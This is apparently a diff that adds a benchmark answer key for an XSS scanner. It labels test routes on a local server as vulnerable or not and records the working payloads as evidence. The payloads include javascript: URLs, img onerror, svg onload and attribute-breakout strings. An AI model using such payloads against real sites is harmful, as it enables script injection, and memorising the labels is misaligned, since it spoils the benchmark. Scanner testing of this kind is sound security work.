@@ -1,0 +1,2527 @@
+{
+ "canary": "914771",
+ "labels": {
+  "/address/URL/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URL/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/URLUnencoded/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/baseURI/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/documentURI/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location.hash/assign": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/location.hash/assign#javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location.hash/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location.hash/eval": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/location.hash/eval#alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/formaction": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/location.hash/formaction#javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/function": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/location.hash/function#alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/inlineevent": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/location.hash/inlineevent#alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location.hash/jshref": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/location.hash/jshref#javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/onclickAddEventListener": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/location.hash/onclickAddEventListener#alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/onclickSetAttribute": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/location.hash/onclickSetAttribute#alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location.hash/replace": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/location.hash/replace#javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location.hash/setTimeout": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/location.hash/setTimeout#alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/location/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/location/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationhref/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/assign": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/eval": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/formaction": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/function": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/inlineevent": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/jshref": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/onclickAddEventListener": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/onclickSetAttribute": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationpathname/setTimeout": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationsearch/assign": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/locationsearch/assign?javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/documentwrite": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationsearch/documentwriteln": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationsearch/eval": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/locationsearch/eval?alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/formaction": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/locationsearch/formaction?javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/function": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/address/locationsearch/function?alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/inlineevent": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/locationsearch/inlineevent?alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/innerHtml": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationsearch/jshref": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/locationsearch/jshref?javascript:alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/onclickAddEventListener": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/locationsearch/onclickAddEventListener?alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/onclickSetAttribute": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/locationsearch/onclickSetAttribute?alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/address/locationsearch/rangeCreateContextualFragment": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationsearch/replace": {
+   "evidence": null,
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": false
+  },
+  "/address/locationsearch/setTimeout": {
+   "evidence": {
+    "payload": "alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/address/locationsearch/setTimeout?alert(914771)"
+   },
+   "inject": "url",
+   "kind": "address",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_name/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_name/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_name/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_name/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_name/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_name/SINGLE_QUOTED_ATTRIBUTE?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_name/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_name/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_quoted/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/attribute_quoted/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/attribute_quoted/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_quoted/SINGLE_QUOTED_ATTRIBUTE?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_quoted/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_quoted/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_script/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/attribute_script/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/attribute_script/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_script/SINGLE_QUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_script/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_script/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_singlequoted/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "'><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_singlequoted/DOUBLE_QUOTED_ATTRIBUTE?q=%27%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_singlequoted/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/attribute_singlequoted/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/attribute_singlequoted/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_singlequoted/UNQUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_unquoted/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_unquoted/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_unquoted/HTML": {
+   "evidence": {
+    "payload": "x onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_unquoted/HTML?q=x%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_unquoted/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_unquoted/SINGLE_QUOTED_ATTRIBUTE?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/attribute_unquoted/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "x onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/attribute_unquoted/UNQUOTED_ATTRIBUTE?q=x%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/body/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/body/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/body/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/body/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/body/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/body/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/body_comment/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "--><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/body_comment/DOUBLE_QUOTED_ATTRIBUTE?q=--%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/body_comment/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/body_comment/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "--><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/body_comment/SINGLE_QUOTED_ATTRIBUTE?q=--%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/body_comment/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_import/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_import/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_import/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_import/SINGLE_QUOTED_ATTRIBUTE?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_import/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_import/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "load",
